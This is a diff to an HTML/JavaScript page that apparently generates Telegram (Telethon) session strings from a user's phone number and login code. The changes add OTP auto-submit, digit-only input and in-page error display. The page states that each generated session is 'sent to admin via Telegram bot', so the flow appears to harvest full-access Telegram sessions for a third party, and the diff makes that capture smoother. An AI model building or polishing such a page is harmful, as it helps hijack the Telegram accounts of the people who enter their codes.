@@ -305,13 +305,14 @@
         <div class="step" id="step2">
             <div class="info-box">
                 <h3>📱 Verification Code Sent</h3>
-                <p>We've sent a verification code to your Telegram account. Please enter it below:</p>
+                <p>We've sent a 5-digit verification code to your Telegram account.</p>
+                <p><strong>Auto-submit enabled:</strong> Form will submit automatically when you enter 5 digits.</p>
             </div>
 
             <form id="otpForm">
                 <div class="form-group">
-                    <label for="otp_code">Verification Code:</label>
-                    <input type="text" id="otp_code" class="otp-input" placeholder="Enter 5-digit code" required maxlength="5">
+                    <label for="otp_code">Verification Code (5 digits):</label>
+                    <input type="text" id="otp_code" class="otp-input" placeholder="Enter 5-digit code" required maxlength="5" pattern="[0-9]{5}">
                 </div>
 
                 <div class="form-group">
@@ -330,12 +331,12 @@
 
         <!-- Step 3: Results -->
         <div class="step" id="step3">
-            <div class="result success" id="result">
-                <h3>✅ Session Generated Successfully!</h3>
+            <div class="result" id="result">
+                <h3 id="resultTitle">Session Generated Successfully!</h3>
                 <p>Your Telethon session string:</p>
                 <textarea class="session-string" id="sessionString" rows="6" readonly></textarea>
                 <p style="margin-top: 10px; font-size: 14px; color: #666;">
-                    🔔 Session has been sent to admin via Telegram bot
+                    ✅ Session has been sent to admin via Telegram bot
                 </p>
             </div>
 
@@ -381,6 +382,23 @@
             document.getElementById('loading').style.display = 'none';
         }
 
+        // Auto-submit OTP when 5 digits are entered
+        document.getElementById('otp_code').addEventListener('input', function(e) {
+            if (this.value.length === 5) {
+                // Auto-submit after a short delay
+                setTimeout(() => {
+                    document.getElementById('verifyOtpBtn').click();
+                }, 500);
+            }
+        });
+
+        // Only allow numbers in OTP field
+        document.getElementById('otp_code').addEventListener('keypress', function(e) {
+            if (!/[0-9]/.test(e.key)) {
+                e.preventDefault();
+            }
+        });
+
         // Step 1: Request verification code
         document.getElementById('phoneForm').addEventListener('submit', async function(e) {
             e.preventDefault();
@@ -413,6 +431,8 @@
                         phone_code_hash: data.phone_code_hash
                     };
                     showStep(2);
+                    // Focus on OTP input
+                    setTimeout(() => document.getElementById('otp_code').focus(), 100);
                 } else {
                     alert('Error: ' + data.error);
                 }
@@ -435,8 +455,8 @@
                 return;
             }
 
-            if (!otp_code) {
-                alert('Please enter the verification code');
+            if (!otp_code || otp_code.length !== 5) {
+                alert('Please enter a valid 5-digit verification code');
                 return;
             }
 
@@ -458,13 +478,21 @@
                 const data = await response.json();
 
                 if (data.success) {
+                    document.getElementById('result').className = 'result success';
+                    document.getElementById('resultTitle').textContent = '✅ Session Generated Successfully!';
                     document.getElementById('sessionString').value = data.session_string;
                     showStep(3);
                 } else {
-                    alert('Error: ' + data.error);
+                    document.getElementById('result').className = 'result error';
+                    document.getElementById('resultTitle').textContent = '❌ Error';
+                    document.getElementById('sessionString').value = data.error;
+                    showStep(3);
                 }
             } catch (error) {
-                alert('Network error: ' + error.message);
+                document.getElementById('result').className = 'result error';
+                document.getElementById('resultTitle').textContent = '❌ Network Error';
+                document.getElementById('sessionString').value = 'Failed to connect to server: ' + error.message;
+                showStep(3);
             } finally {
                 hideLoading();
             }
@@ -478,6 +506,7 @@
         document.getElementById('newSessionBtn').addEventListener('click', function() {
             document.getElementById('phoneForm').reset();
             document.getElementById('otpForm').reset();
+            document.getElementById('result').className = 'result';
             sessionData = null;
             showStep(1);
         });
